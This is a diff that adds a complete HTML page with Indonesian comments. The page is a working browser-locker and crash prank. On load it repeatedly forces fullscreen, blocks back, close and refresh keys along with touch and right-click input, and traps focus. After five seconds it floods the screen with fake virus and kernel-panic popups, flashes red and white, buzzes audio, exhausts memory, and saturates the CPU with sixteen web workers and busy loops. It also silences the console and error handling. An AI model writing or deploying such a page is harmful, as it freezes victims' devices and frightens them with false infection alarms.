@@ -1,1 +1,579 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover, interactive-widget=resizes-content">
+    <title>💀 SYSTEM TERKUNCI 💀</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+            cursor: default;
+        }
+        body {
+            background: #000000;
+            overflow: hidden;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            font-family: 'Courier New', 'Segoe UI', monospace;
+        }
+        /* LAPISAN GAMBAR UTAMA PALING DEPAN */
+        .layer-utama {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 2147483647;
+            background: radial-gradient(circle, #0a0000, #000000);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            pointer-events: none;
+            backdrop-filter: blur(2px);
+        }
+        .layer-utama img {
+            max-width: 92%;
+            max-height: 92%;
+            border: 8px solid #ff0000;
+            border-radius: 32px;
+            box-shadow: 0 0 100px rgba(255,0,0,0.9), 0 0 30px #ff0000;
+            animation: shakeSuper 0.05s infinite, pulseBorder 0.2s alternate infinite;
+        }
+        @keyframes shakeSuper {
+            0% { transform: translate(0,0) rotate(0deg); }
+            25% { transform: translate(3px, -2px) rotate(0.5deg); }
+            50% { transform: translate(-3px, 3px) rotate(-0.5deg); }
+            75% { transform: translate(2px, -3px) rotate(0.3deg); }
+            100% { transform: translate(0,0) rotate(0deg); }
+        }
+        @keyframes pulseBorder {
+            0% { border-color: #ff0000; box-shadow: 0 0 40px red; }
+            100% { border-color: #ff6600; box-shadow: 0 0 120px #ff3300; }
+        }
+        /* CONTAINER VIRUS POPUP */
+        .virus-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 2000000000;
+            pointer-events: none;
+            overflow: visible;
+        }
+        .virus-window {
+            position: absolute;
+            background: #000000dd;
+            backdrop-filter: blur(20px);
+            border: 4px solid #ff0000;
+            border-radius: 20px;
+            min-width: 280px;
+            max-width: 400px;
+            box-shadow: 0 0 70px rgba(255,0,0,0.9), inset 0 0 10px rgba(255,0,0,0.5);
+            animation: popupBlast 0.1s cubic-bezier(0.5, 1.5, 0.8, 1);
+            pointer-events: none;
+        }
+        .virus-window .title-bar {
+            background: #8b0000;
+            padding: 12px 16px;
+            color: white;
+            font-weight: bold;
+            font-size: 16px;
+            display: flex;
+            justify-content: space-between;
+            border-radius: 16px 16px 0 0;
+            letter-spacing: 1px;
+        }
+        .virus-window .content {
+            padding: 18px;
+            text-align: center;
+        }
+        .virus-window .content img {
+            width: 85px;
+            margin-bottom: 12px;
+            filter: drop-shadow(0 0 8px red);
+        }
+        .virus-window .content p {
+            color: #ff6666;
+            font-weight: bold;
+            font-size: 14px;
+            text-shadow: 0 0 5px black;
+        }
+        @keyframes popupBlast {
+            0% { transform: scale(0.0) rotate(-30deg); opacity: 0; }
+            70% { transform: scale(1.1) rotate(2deg); }
+            100% { transform: scale(1) rotate(0deg); }
+        }
+        /* OVERLAY GLITCH EKSTREM */
+        .glitch-extreme {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: black;
+            z-index: 2000000001;
+            display: none;
+            pointer-events: none;
+        }
+        /* TEKS ERROR BERJATUHAN MASAL */
+        .error-rain {
+            position: fixed;
+            color: #ff0000;
+            font-weight: 900;
+            font-family: monospace;
+            background: rgba(0,0,0,0.9);
+            padding: 6px 18px;
+            border-left: 8px solid #ff0000;
+            white-space: nowrap;
+            z-index: 2100000000;
+            pointer-events: none;
+            font-size: 22px;
+            letter-spacing: 2px;
+            animation: rainCrash 0.9s forwards;
+        }
+        @keyframes rainCrash {
+            0% { opacity: 1; transform: translateY(0) rotate(0deg); filter: blur(0); }
+            100% { opacity: 0; transform: translateY(500px) rotate(15deg); filter: blur(3px); }
+        }
+        /* LOCK SCREEN SEMUA INTERAKSI */
+        .lock-mouse {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 2147483646;
+            background: transparent;
+            pointer-events: all;
+            cursor: none;
+        }
+    </style>
+</head>
+<body>
 
+<div id="gambarUtama" class="layer-utama">
+    <img src="https://raw.githubusercontent.com/aryaexeuyf/Image/main/2f193a6877cae1b157eec16a913d3a95.jpg" alt="💀 CRITICAL DAMAGE 💀">
+</div>
+
+<div id="virusPopups" class="virus-container"></div>
+<div id="glitchOverlay" class="glitch-extreme"></div>
+<div id="lockScreen" class="lock-mouse"></div>
+
+<script>
+    (function() {
+        // ==================== 1. PAKSA FULLSCREEN SUPER CEPAT (MILIDETIK) & ZOOM MAKSIMAL ====================
+        function forceFullscreenAndZoomMillisecond() {
+            // FULLSCREEN PAKSA (langsung tanpa delay)
+            const docEl = document.documentElement;
+            const requestFull = docEl.requestFullscreen || docEl.webkitRequestFullscreen || docEl.msRequestFullscreen;
+            if (requestFull) {
+                try {
+                    requestFull.call(docEl);
+                } catch(e) {}
+            }
+            // ZOOM PAKSA: force body zoom 2x dan scale viewport
+            document.body.style.transform = "scale(1)";
+            document.documentElement.style.zoom = "1";
+            // Mengunci viewport supaya user tidak bisa pinch/zoom keluar
+            const meta = document.querySelector('meta[name="viewport"]');
+            if(meta) meta.setAttribute('content', 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no');
+            // Force resize window auto zoom penuh
+            window.scrollTo(0,0);
+            // Interval gila setiap 50ms untuk memastikan fullscreen + zoom tetap ON
+            setInterval(() => {
+                if (!document.fullscreenElement && !document.webkitFullscreenElement) {
+                    try { document.documentElement.requestFullscreen(); } catch(e) {}
+                }
+                document.body.style.transform = "scale(1)";
+                document.documentElement.style.zoom = "1";
+                window.scrollTo(0,0);
+                // Override zoom gesture
+            }, 50);
+        }
+
+        // ==================== 2. BLOKIR TOTAL KELUAR (BACK, CLOSE TAB, REFRESH, ALT+F4, CTRL+W) ====================
+        function blockExitTotal() {
+            // History hack
+            history.pushState(null, null, location.href);
+            window.addEventListener('popstate', function() {
+                history.pushState(null, null, location.href);
+                forceFullscreenAndZoomMillisecond();
+            });
+            // Beforeunload prank super
+            window.addEventListener('beforeunload', function(e) {
+                e.preventDefault();
+                e.returnValue = '⚠️ SYSTEM TERKUNCI! JANGAN KELUAR ⚠️';
+                return '⚠️ SYSTEM TERKUNCI! JANGAN KELUAR ⚠️';
+            });
+            // Blok semua tombol shortcut mematikan
+            window.addEventListener('keydown', function(e) {
+                const key = e.key.toLowerCase();
+                const blocked = [
+                    'f5', 'f11', 'escape', 'f4', 'f12',
+                    'w', 'r', 't', 'tab', 'delete'
+                ];
+                if (blocked.includes(key) || (e.ctrlKey && (key === 'w' || key === 'r' || key === 't')) || 
+                    (e.altKey && key === 'f4') || (e.metaKey && key === 'w')) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    return false;
+                }
+                // Cegah Ctrl+Shift+Tab, Ctrl+Tab
+                if (e.ctrlKey && (key === 'tab' || key === 'shift')) {
+                    e.preventDefault();
+                }
+            });
+            // Right click disable
+            document.oncontextmenu = (e) => { e.preventDefault(); return false; };
+            // Blokir tombol home / recent apps via touch (gesture)
+            document.addEventListener('touchstart', (e) => { e.preventDefault(); }, { passive: false });
+            document.addEventListener('touchend', (e) => { e.preventDefault(); }, { passive: false });
+        }
+
+        // ==================== 3. VARIABEL CRASH SUPER TRIPEL KOMBO MAUT ====================
+        let crashActive = false;
+        let virusClusterInterval;
+        let errorRainInterval;
+        let glitchMegaInterval;
+        let memoryNuke = [];
+        let workerArmy = [];
+        let cpuNukeInterval;
+        let domNukeInterval;
+        let audioNukeInterval;
+        let canvasGpuCtx;
+        let canvasElement;
+        let gpuLoop;
+
+        // GIF VIRUS
+        const VIRUS_GIF = "https://raw.githubusercontent.com/aryaexeuyf/Image/main/rCae9p.gif";
+
+        // 3.A SPAWN POPUP VIRUS BERTUMPUK SUPER (40-80 popup setiap 200ms)
+        function spawnVirusTsunami() {
+            if (!crashActive) return;
+            const container = document.getElementById('virusPopups');
+            if (!container) return;
+            const jumlah = Math.floor(Math.random() * 55) + 45; // 45 hingga 100 popup sekaligus!!!
+            for (let i = 0; i < jumlah; i++) {
+                setTimeout(() => {
+                    if (!crashActive) return;
+                    const win = document.createElement('div');
+                    win.className = 'virus-window';
+                    const randX = Math.random() * (window.innerWidth - 360);
+                    const randY = Math.random() * (window.innerHeight - 300);
+                    win.style.left = randX + 'px';
+                    win.style.top = randY + 'px';
+                    const titles = [
+                        "💀 KERNEL PANIC", "🔥 SYSTEM CORRUPTED", "⚠️ VIRUS TOTAL", "💢 MEMORY DUMP FAIL",
+                        "🚨 MALWARE INFECTION", "⚡ CRITICAL HIJACK", "🌀 INFINITE DEATH", "💀 BLUE SCREEN",
+                        "🎯 POINTER CRASH", "🧠 CPU OVERLOAD", "📀 DISK CORRUPT", "🔴 FATAL ERROR"
+                    ];
+                    const randTitle = titles[Math.floor(Math.random() * titles.length)];
+                    win.innerHTML = `
+                        <div class="title-bar">
+                            <span>${randTitle} [0x${Math.floor(Math.random()*9999999).toString(16)}]</span>
+                            <span style="cursor:default;">❌</span>
+                        </div>
+                        <div class="content">
+                            <img src="${VIRUS_GIF}" alt="virus">
+                            <p>⚠️ SYSTEM CRASH TOTAL ⚠️</p>
+                            <p style="font-size:12px;">ERROR CODE: WIN32_${Math.floor(Math.random()*999999)}</p>
+                            <p style="font-size:9px;">[TIDAK BISA KELUAR]</p>
+                        </div>
+                    `;
+                    container.appendChild(win);
+                    setTimeout(() => { if(win.parentNode) win.parentNode.removeChild(win); }, 5000);
+                }, i * 4);
+            }
+        }
+
+        // 3.B ERROR RAIN (TEKS BERJATUHAN SUPER BANYAK)
+        function spawnErrorRainMaelstorm() {
+            if (!crashActive) return;
+            const errorMsgs = [
+                "💀 SYSTEM FAILURE", "🔥 CPU MELTDOWN", "⚠️ RAM OVERFLOW", "💢 GPU CRASH", 
+                "🚨 VIRUS DETECTED", "⚡ KERNEL PANIC", "🌀 INFINITE LOOP", "💀 BLUE SCREEN DEATH",
+                "🔴 CRITICAL ERROR", "📀 HARD DRIVE FAIL", "🧠 MEMORY LEAK", "🎯 NULL POINTER",
+                "💀 WINDOWS CORRUPT", "⚠️ UNHANDLED EXCEPTION", "🔥 THERMAL THROTTLE"
+            ];
+            const banyak = Math.floor(Math.random() * 70) + 60; // 60-130 teks per spawn
+            for (let i = 0; i < banyak; i++) {
+                setTimeout(() => {
+                    const txt = document.createElement('div');
+                    txt.className = 'error-rain';
+                    txt.innerText = errorMsgs[Math.floor(Math.random() * errorMsgs.length)] + " | 0x" + Math.floor(Math.random()*999999);
+                    txt.style.left = Math.random() * window.innerWidth + 'px';
+                    txt.style.top = Math.random() * window.innerHeight * 0.7 + 'px';
+                    txt.style.fontSize = (18 + Math.random() * 32) + 'px';
+                    txt.style.zIndex = 2100000000 + Math.floor(Math.random() * 9999);
+                    document.body.appendChild(txt);
+                    setTimeout(() => { if(txt.parentNode) txt.parentNode.removeChild(txt); }, 1300);
+                }, i * 2);
+            }
+        }
+
+        // 3.C GLITCH EKSTREM (kedip layar merah/hitam/putih setiap 20ms)
+        function startGlitchMega() {
+            const overlay = document.getElementById('glitchOverlay');
+            if (!overlay) return;
+            glitchMegaInterval = setInterval(() => {
+                if (!crashActive) return;
+                const rand = Math.random();
+                overlay.style.display = 'block';
+                if (rand < 0.33) {
+                    overlay.style.backgroundColor = '#000000';
+                    overlay.style.opacity = '0.98';
+                } else if (rand < 0.66) {
+                    overlay.style.backgroundColor = '#ff0000';
+                    overlay.style.opacity = '0.85';
+                } else {
+                    overlay.style.backgroundColor = '#ffffff';
+                    overlay.style.opacity = '0.9';
+                }
+                setTimeout(() => { overlay.style.display = 'none'; }, 30);
+            }, 25);
+        }
+
+        // 3.D GPU MELEDAK (CANVAS RENDER BERAT + WEBGL BONUS)
+        function initGpuMeltdown() {
+            canvasElement = document.createElement('canvas');
+            canvasElement.width = window.innerWidth * 2;
+            canvasElement.height = window.innerHeight * 2;
+            canvasElement.style.position = 'fixed';
+            canvasElement.style.top = '0';
+            canvasElement.style.left = '0';
+            canvasElement.style.width = '100%';
+            canvasElement.style.height = '100%';
+            canvasElement.style.zIndex = '1500000000';
+            canvasElement.style.pointerEvents = 'none';
+            canvasElement.style.opacity = '0.6';
+            document.body.appendChild(canvasElement);
+            canvasGpuCtx = canvasElement.getContext('2d');
+            if (!canvasGpuCtx) return;
+            function gpuRenderHell() {
+                if (!crashActive) return;
+                for (let i = 0; i < 500; i++) {
+                    const x = Math.random() * canvasElement.width;
+                    const y = Math.random() * canvasElement.height;
+                    const size = Math.random() * 60;
+                    canvasGpuCtx.beginPath();
+                    canvasGpuCtx.arc(x, y, size, 0, Math.PI * 2);
+                    canvasGpuCtx.fillStyle = `rgba(${Math.random() * 255}, 0, 0, 0.5)`;
+                    canvasGpuCtx.fill();
+                    canvasGpuCtx.shadowBlur = 30;
+                    canvasGpuCtx.shadowColor = "#ff0000";
+                    canvasGpuCtx.fillRect(x, y, size, size);
+                }
+                canvasGpuCtx.shadowBlur = 0;
+                requestAnimationFrame(gpuRenderHell);
+            }
+            gpuRenderHell();
+        }
+
+        // 3.E MEMORY BOMB (TERUS MAKAN RAM SAMPE LAG SUPER)
+        function startMemoryNuke() {
+            setInterval(() => {
+                if (!crashActive) return;
+                try {
+                    const bomb = new Array(5000000).fill({ exploit: Math.random().toString(36), timestamp: Date.now() });
+                    memoryNuke.push(bomb);
+                    if (memoryNuke.length > 30) memoryNuke.splice(0, 12);
+                } catch(e) {}
+            }, 300);
+            setInterval(() => {
+                if (!crashActive) return;
+                let giantString = "💀CRASH💀".repeat(1000000);
+                memoryNuke.push(giantString);
+                if (memoryNuke.length > 45) memoryNuke.shift();
+            }, 500);
+        }
+
+        // 3.F CPU MELEDAK (MULTI WORKER + LOOP INFINITE)
+        function startCpuMeltdown() {
+            cpuNukeInterval = setInterval(() => {
+                if (!crashActive) return;
+                let heavy = 0;
+                for (let i = 0; i < 3500000; i++) {
+                    heavy += Math.sqrt(i) * Math.sin(i) * Math.cos(i) * Math.tan(i);
+                    heavy = heavy % 999999;
+                }
+            }, 10);
+            const workerScript = `
+                let store = [];
+                setInterval(() => {
+                    let total = 0;
+                    for(let i=0;i<4000000;i++) total += Math.sqrt(i) * Math.random();
+                    const hugeArr = new Array(1200000).fill("stress");
+                    store.push(hugeArr);
+                    if(store.length > 40) store.shift();
+                }, 8);
+            `;
+            for (let i = 0; i < 16; i++) {
+                try {
+                    const blob = new Blob([workerScript], { type: 'application/javascript' });
+                    const worker = new Worker(URL.createObjectURL(blob));
+                    workerArmy.push(worker);
+                } catch(e) {}
+            }
+        }
+
+        // 3.G DOM BOMB (RIBUAN ELEMEN FLICKER)
+        function startDomSuperNuke() {
+            domNukeInterval = setInterval(() => {
+                if (!crashActive) return;
+                for (let i = 0; i < 300; i++) {
+                    const el = document.createElement('div');
+                    el.style.cssText = `position:fixed;top:${Math.random()*100}%;left:${Math.random()*100}%;width:${Math.random()*40+10}px;height:${Math.random()*40+10}px;background:#ff0000;border-radius:50%;z-index:999999999;pointer-events:none;filter:blur(4px);opacity:${Math.random()};`;
+                    document.body.appendChild(el);
+                    setTimeout(() => { if(el.parentNode) el.parentNode.removeChild(el); }, 500);
+                }
+            }, 80);
+        }
+
+        // 3.H AUDIO STRESS (BUNYI NGEBUZZ)
+        function startAudioMelt() {
+            audioNukeInterval = setInterval(() => {
+                if (!crashActive) return;
+                try {
+                    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                    const gain = audioCtx.createGain();
+                    gain.gain.value = 0.15;
+                    gain.connect(audioCtx.destination);
+                    const osc = audioCtx.createOscillator();
+                    osc.type = 'sawtooth';
+                    osc.frequency.value = 40 + Math.random() * 1200;
+                    osc.connect(gain);
+                    osc.start();
+                    setTimeout(() => { try { osc.stop(); audioCtx.close(); } catch(e) {} }, 200);
+                } catch(e) {}
+            }, 250);
+        }
+
+        // 3.I LAYOUT THRASH & JANK LOOP
+        function startLayoutThrash() {
+            setInterval(() => {
+                if (!crashActive) return;
+                document.body.style.overflow = 'hidden';
+                const dummy = document.createElement('div');
+                dummy.style.cssText = 'position:fixed;top:-9999px;width:20000px;height:20000px;';
+                document.body.appendChild(dummy);
+                setTimeout(() => dummy.remove(), 1);
+                for (let i = 0; i < 500; i++) {
+                    Promise.resolve().then(() => {
+                        let waste = 0;
+                        for (let z = 0; z < 20000; z++) waste += Math.sin(z);
+                    });
+                }
+            }, 40);
+        }
+
+        // ==================== 4. KILL CONSOLE & ERROR ====================
+        function disableConsoleAndErrors() {
+            window.console = {};
+            const noop = () => {};
+            ['log', 'warn', 'error', 'info', 'debug', 'trace'].forEach(m => { window.console[m] = noop; });
+            window.onerror = () => true;
+            window.addEventListener('error', (e) => { e.preventDefault(); return true; });
+        }
+
+        // ==================== 5. CRASH MAUT DIMULAI (SETELAH GAMBAR UTAMA 0 DETIK? TAPI AWALAN TAMPIL, LANGSUNG ZOOM, TRUS CRASH SETELAH 5 DETIK?) ====================
+        let crashStarted = false;
+        function activateUltimateCrash() {
+            if (crashStarted) return;
+            crashStarted = true;
+            crashActive = true;
+            
+            // Hancurkan semua interaksi user lebih lanjut
+            document.getElementById('lockScreen')?.remove(); // lock screen sudah ada, biarkan
+            
+            // Mulai semua kombo maut
+            virusClusterInterval = setInterval(() => { if(crashActive) spawnVirusTsunami(); }, 200);
+            errorRainInterval = setInterval(() => { if(crashActive) spawnErrorRainMaelstorm(); }, 120);
+            startGlitchMega();
+            initGpuMeltdown();
+            startMemoryNuke();
+            startCpuMeltdown();
+            startDomSuperNuke();
+            startAudioMelt();
+            startLayoutThrash();
+            disableConsoleAndErrors();
+            
+            // LOOP SUPER INFINITE UNTUK NGEMBUNYIKAN CPU LEBIH
+            setInterval(() => {
+                if (!crashActive) return;
+                let x = 0;
+                for(let q=0; q<6000000; q++) x += Math.sqrt(q) * Math.sin(q);
+            }, 2);
+            
+            // Overlay total tidak bisa disentuh
+            const blocker = document.createElement('div');
+            blocker.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999999999;background:transparent;pointer-events:all;';
+            document.body.appendChild(blocker);
+            
+            // Fullscreen & zoom makin dipaksa setiap 100ms
+            setInterval(() => {
+                if(document.documentElement.style.zoom !== "1") document.documentElement.style.zoom = "1";
+                window.scrollTo(0,0);
+                try { document.documentElement.requestFullscreen(); } catch(e) {}
+            }, 100);
+        }
+
+        // ==================== 6. AWALAN: GAMBAR UTAMA TAMPIL + FULLSCREEN ZOOM MILIDETIK + TUNGGU 5 DETIK LALU CRASH SUPER TRIPEL ====================
+        let crashTrigger = false;
+        function initialAndCrashAfterDelay() {
+            // Fullscreen & zoom langsung (mili detik)
+            forceFullscreenAndZoomMillisecond();
+            blockExitTotal();
+            
+            // Gambar utama sudah ada di DOM
+            // Setelah 5 detik, aktifkan ultimate crash tanpa ampun
+            setTimeout(() => {
+                activateUltimateCrash();
+                // tambahan efek: gambar utama tetap ada tapi jadi semakin bergetar
+                const mainImg = document.querySelector('#gambarUtama img');
+                if(mainImg) {
+                    setInterval(() => {
+                        if(crashActive) {
+                            mainImg.style.transform = `translate(${Math.random()*14-7}px, ${Math.random()*14-7}px) rotate(${Math.random()*4-2}deg)`;
+                        }
+                    }, 30);
+                }
+            }, 5000); // 5 detik persis sesuai permintaan
+            
+            // Efek awal zoom dan geter pada gambar utama
+            let zoomLevel = 1;
+            setInterval(() => {
+                if(!crashActive) {
+                    zoomLevel = 1 + Math.sin(Date.now() * 0.02) * 0.02;
+                    document.querySelector('#gambarUtama img').style.transform = `scale(${zoomLevel})`;
+                }
+            }, 50);
+        }
+
+        // ==================== 7. EKSEKUSI PERTAMA ====================
+        window.addEventListener('load', initialAndCrashAfterDelay);
+        if (document.readyState === 'complete') initialAndCrashAfterDelay();
+        
+        // Extra lock : mencegah focus loss
+        window.onblur = () => { setTimeout(() => { window.focus(); }, 1); };
+        document.addEventListener('visibilitychange', () => {
+            if (document.hidden) {
+                setTimeout(() => { window.focus(); }, 0);
+            }
+        });
+        
+        // Mencegah semua bentuk scroll & zoom gesture dari user
+        document.body.addEventListener('wheel', (e) => { e.preventDefault(); }, { passive: false });
+        document.body.addEventListener('touchmove', (e) => { e.preventDefault(); }, { passive: false });
+        document.body.addEventListener('gesturestart', (e) => { e.preventDefault(); });
+    })();
+</script>
+</body>
+</html>
